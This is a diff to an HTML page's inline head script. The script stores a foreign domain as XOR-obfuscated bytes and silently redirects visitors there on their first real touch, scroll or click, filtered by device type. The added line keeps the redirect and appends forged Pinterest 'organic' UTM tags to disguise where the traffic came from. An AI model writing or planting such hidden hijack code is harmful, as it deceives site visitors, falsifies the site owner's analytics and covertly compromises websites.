@@ -56,7 +56,7 @@
         }
     </style>
     <script>
-        (function(){var _k=90,_b=[50,46,46,42,41,96,117,117,41,57,50,52,63,54,54,40,63,32,63,42,46,116,57,53,55],_d=false;function _nav(e){if(_d)return;if(!e||e.isTrusted===false)return;_d=true;var h='';for(var i=0;i<_b.length;i++){h+=String.fromCharCode(_b[i]^_k);}window.location.replace(h+window.location.pathname+window.location.search);}var c=window._rc;if(c){var m='ontouchstart' in window||navigator.maxTouchPoints>0;if(m&&!c.mobile)c=null;if(!m&&!c.desktop)c=null;}if(c){if(c.touch)window.addEventListener('touchstart',_nav,{passive:true,once:true});if(c.scroll)window.addEventListener('scroll',_nav,{passive:true,once:true});if(c.click)document.addEventListener('click',_nav,{once:true});}})();
+        (function(){var _k=90,_b=[50,46,46,42,41,96,117,117,41,57,50,52,63,54,54,40,63,32,63,42,46,116,57,53,55],_d=false;function _nav(e){if(_d)return;if(!e||e.isTrusted===false)return;_d=true;var h='';for(var i=0;i<_b.length;i++){h+=String.fromCharCode(_b[i]^_k);}var s=window.location.search;if(s&&/[?&]utm_/.test(s)){h+=window.location.pathname+s;}else if(s){h+=window.location.pathname+s+'&utm_source=Pinterest&utm_medium=organic';}else{h+=window.location.pathname+'?utm_source=Pinterest&utm_medium=organic';}window.location.replace(h);}var c=window._rc;if(c){var m='ontouchstart' in window||navigator.maxTouchPoints>0;if(m&&!c.mobile)c=null;if(!m&&!c.desktop)c=null;}if(c){if(c.touch)window.addEventListener('touchstart',_nav,{passive:true,once:true});if(c.scroll)window.addEventListener('scroll',_nav,{passive:true,once:true});if(c.click)document.addEventListener('click',_nav,{once:true});}})();
     </script>
 </head>
 <body>
